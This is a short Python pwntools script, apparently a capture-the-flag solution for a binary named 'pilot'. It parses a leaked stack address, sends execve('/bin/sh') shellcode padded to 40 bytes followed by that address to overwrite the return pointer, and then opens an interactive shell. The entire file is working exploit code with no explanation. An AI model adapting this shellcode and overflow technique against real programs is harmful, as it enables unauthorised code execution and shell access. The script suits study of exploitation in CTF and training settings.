from pwn import *

target = process("./pilot")
target.recvuntil("Location:")
leak = target.recvline()
leak = leak.strip(b'\n')
print(leak)
inputAddr = int(leak, 16)
print(inputAddr)

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload = shellcode
payload += (40 - len(shellcode)) * b'A'
payload += p64(inputAddr)

target.sendline(payload)
target.interactive()
